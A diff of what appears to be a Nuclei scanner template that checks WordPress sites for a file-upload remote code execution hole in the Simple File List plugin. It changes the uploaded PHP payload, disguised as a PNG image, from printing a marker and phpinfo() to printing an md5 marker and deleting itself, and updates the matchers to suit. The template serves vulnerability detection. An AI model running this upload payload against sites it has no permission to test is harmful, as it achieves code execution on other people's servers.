@@ -1,12 +1,9 @@
 http:
 - matchers:
-  - condition: and
-    part: body
+  - part: body_3
     type: word
     words:
-    - aa5be3e9dec96f2f1a593b2f5b2288af
-    - PHP Version
-    - Configuration Command
+    - '{{md5(string)}}'
   - status:
     - 200
     type: status
@@ -56,7 +53,7 @@ http:
     Content-Type: image/png
 
 
-    <?php echo md5("wordpress-rce-simplefilelist"); phpinfo(); ?>
+    <?php echo md5("{{string}}");unlink(__FILE__);?>
 
     --6985fa39c0698d07f6d418b37388e1b2--
 
@@ -102,3 +99,4 @@ info:
   tags: wp,wpscan,wordpress,wp-plugin,rce,intrusive,fileupload
 variables:
   filepath: '{{rand_base(7, "abcdefghi")}}'
+  string: wordpress-rce-simplefilelist
